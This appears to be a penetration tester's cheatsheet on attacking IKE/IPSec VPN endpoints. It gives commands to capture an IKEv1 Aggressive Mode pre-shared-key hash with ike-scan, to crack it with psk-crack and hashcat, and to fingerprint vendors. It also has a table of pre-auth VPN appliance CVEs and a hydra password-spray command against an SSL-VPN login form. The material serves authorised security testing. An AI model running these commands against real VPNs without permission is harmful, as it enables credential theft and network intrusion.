---
tags: [pentest, cheatsheet, ike, ipsec, vpn, service, both]
port: [500, 4500]
phase: reference
---
# IKE / IPSec VPN (500 / 4500 UDP)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Both ports are **UDP** and signal an IPSec/IKE VPN endpoint — a perimeter remote-access concentrator (Cisco ASA, Fortigate, SonicWall, pfSense, strongSwan, Juniper) or a site-to-site tunnel. 500 is the IKE control channel; 4500 is NAT-Traversal (encapsulated ESP). The presence of either means the device speaks IKEv1 or IKEv2 — and **IKEv1 Aggressive Mode** is the prize.

**The key win:** In IKEv1 Aggressive Mode, the responder sends a hash of the Pre-Shared Key in a single packet to **any unauthenticated requester**. Capture it once, crack offline with hashcat. No client install, no MitM, no creds needed. Years of corporate VPN credentials live and die on PSK strength.

Beyond PSK: identify the **vendor and firmware** and check for the CVE soup that hits VPN appliances annually — Pulse Secure CVE-2019-11510 (pre-auth file read), Fortinet CVE-2018-13379 (path traversal → creds in /sslvpn_websession), Citrix CVE-2019-19781, etc.

## Enumerate transforms

`ike-scan` is the canonical tool. Confirms IKEv1/v2, lists accepted transforms, reveals vendor.

```bash
sudo apt install ike-scan
sudo ike-scan -M $IP                 # multiline output; v1 main mode
sudo ike-scan -2 -M $IP              # IKEv2
sudo ike-scan -A -M $IP              # AGGRESSIVE MODE — the goal
sudo ike-scan -A -M --id=test $IP    # supply a group/identifier name
```

Also try common group names (`vpn`, `remote`, `corp`, the company name).

## Aggressive Mode PSK hash capture → crack

```bash
sudo ike-scan -M -A --id=vpngroup $IP -P psk_hash.txt
# psk_hash.txt is in psk-crack format

# Crack with built-in psk-crack
psk-crack -d /usr/share/wordlists/rockyou.txt psk_hash.txt

# Or hashcat (IKE PSK SHA1 = 5300, MD5 = 5400)
hashcat -m 5300 psk_hash.txt rockyou.txt
hashcat -m 5400 psk_hash.txt rockyou.txt
```

## Vendor / product fingerprinting

```bash
# ike-scan reports vendor IDs (VID) — look up against ike-scan's vendor file
ike-scan -M $IP | grep -i vid

# Check 443 / 4443 / 10443 on the same host for the web admin/SSL-VPN
nmap -sV -p 443,4443,8443,10443 $IP
curl -ks https://$IP/ | grep -iE 'fortinet|pulse|cisco|sonicwall|sophos|paloalto|citrix'
```

## CVE lookups by product (run these FIRST)

| Product | CVE | Effect |
| --- | --- | --- |
| Pulse Secure (Connect Secure) | CVE-2019-11510 | Pre-auth arbitrary file read → /etc/passwd, plaintext creds, session files |
| Fortinet FortiOS SSL-VPN | CVE-2018-13379 | Path traversal → `/sslvpn_websession` exposes creds in cleartext |
| Citrix ADC (NetScaler) | CVE-2019-19781 | Unauth RCE via `/vpns/` directory traversal |
| Cisco ASA | CVE-2018-0101 | Pre-auth heap overflow → RCE in webvpn |
| Palo Alto GlobalProtect | CVE-2019-1579 | Pre-auth RCE in SSL-VPN |
| SonicWall SMA / SRA | CVE-2021-20016 | SQLi unauth → session hijack |
| Fortinet FortiOS | CVE-2022-42475 | Heap overflow pre-auth RCE in SSL-VPN |

## SSL-VPN portal attacks (if 443 is the entry, not 500)

```bash
# Identify the portal
curl -ks https://$IP/remote/login -I
curl -ks https://$IP/dana-na/auth/url_default/welcome.cgi -I    # Pulse
curl -ks https://$IP/+CSCOE+/logon.html -I                       # Cisco AnyConnect / ASA

# Credential stuffing / spray
hydra -L users.txt -P passwords.txt https-post-form "/remote/logincheck:ajax=1&username=^USER^&realm=&credential=^PASS^:F=login_failed" $IP
```

## Nmap NSE

```bash
sudo nmap -sU -p 500 --script ike-version $IP
sudo nmap -sU -p 500 --script ike-version --script-args "ike-version.transforms=10" $IP
```

## Detection / OPSEC notes

`ike-scan` against Aggressive Mode is extremely loud on a tuned IDS — every modern UTM logs IKE_AGG with non-domain identifier as a brute-force indicator. Coordinate timing with the engagement window.

## Related

- [[06 - Hashcat Core]] — modes 5300/5400
- [[../03 - Scanning/07 - nmap Service and Version Detection]]
